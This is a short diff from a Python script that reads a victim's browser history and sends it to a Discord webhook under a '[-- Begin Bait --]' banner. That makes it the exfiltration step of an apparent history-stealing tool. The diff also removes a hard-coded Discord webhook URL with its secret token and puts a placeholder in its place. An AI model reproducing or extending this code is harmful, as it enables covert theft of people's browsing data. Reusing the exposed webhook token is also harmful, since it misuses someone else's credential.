@@ -12,7 +12,7 @@ outputs = get_history()
 # his is a list of (datetime.datetime, url) tuples
 his = outputs.histories
 
-webhook = Webhook.from_url("https://discord.com/api/webhooks/967788713486712872/IWP3nLqUNphUg821lQyN6k5ZCfuMsE8nfv5duy3huNbE_EGjtc3FrxLc-kVbNf7mMT7w", adapter=RequestsWebhookAdapter())
+webhook = Webhook.from_url("webhook-url here", adapter=RequestsWebhookAdapter())
 webhook.send("```ini\n[-- Begin Bait --]\n```")
 
 
